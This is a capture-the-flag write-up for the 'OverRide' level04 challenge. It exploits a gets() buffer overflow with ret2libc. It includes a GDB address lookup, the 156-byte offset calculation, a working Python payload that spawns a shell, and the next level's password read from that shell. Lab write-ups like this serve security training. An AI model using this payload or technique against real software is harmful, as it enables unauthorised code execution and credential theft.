level04
=======
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

*	We have a *level04*  executable and here is the [code](src/level04.c)
* Looking at the code, we notice:
  - `fork()` creates a child process, which handles the user input.
  - The parent uses `ptrace()` to monitor the child.
  - `gets()` reads into a 128-byte buffer without checking its size, allowing a **buffer overflow**.
  - NX is disabled, so shellcode is possible, but we'll use **ret2libc**.

* First, we need to find the offset to overwrite the return address. GDB is a bit tricky here because of `fork()` and `ptrace()`, so we can calculate it directly from the stack layout in Ghidra:
  ```c
  char s[128]; // [esp+20h] [ebp-98h]
  ```
  - The buffer has a size of **128 bytes**.
  - `[ebp-0x98]` means the buffer starts 0x98 bytes below EBP.
  - The saved EBP occupies 4 bytes, and the return address is located at `[ebp+4]`.

  The stack layout looks like this:
  ```text
  [ebp-0x98]  Buffer s[128]       128 bytes
              Other stack space    24 bytes
  [ebp]       Saved EBP             4 bytes
  [ebp+4]     Return address (EIP)  <-- Target
  ```

  Therefore, we need to fill the entire space between the beginning of our buffer and the return address:
  ```text
  0x98 = 152 bytes
  152 + 4 (saved EBP) = 156 bytes
  ```

  Our **offset is 156 bytes**. The next 4 bytes will overwrite the return address.

* Now let's retrieve the addresses for ret2libc:
  ```gdb
  (gdb) p system
  $1 = 0xf7e6aed0 <system>
  (gdb) p exit
  $2 = 0xf7e5eb70 <exit>
  (gdb) find &system,+9999999,"/bin/sh"
  0xf7f897ec
  ```

* Our payload will contain:
  ```text
  [156 bytes padding][system][exit][/bin/sh]
  ```
  - `system` replaces the return address.
  - `exit` becomes the return address for `system()`.
  - `/bin/sh` is passed as the first argument to `system()`.

* Let's exploit it:
  ```console
  level04@OverRide:~$ python -c 'print("a"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])' > /tmp/level04
  level04@OverRide:~$ cat /tmp/level04 - | ./level04
  Give me some shellcode, k
  whoami
  level05
  cat /home/users/level05/.pass
  3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
  ```

* The overflow overwrites the saved return address, redirecting execution to `system("/bin/sh")`.
* The `-` in `cat /tmp/level04 -` keeps stdin open so we can interact with the spawned shell.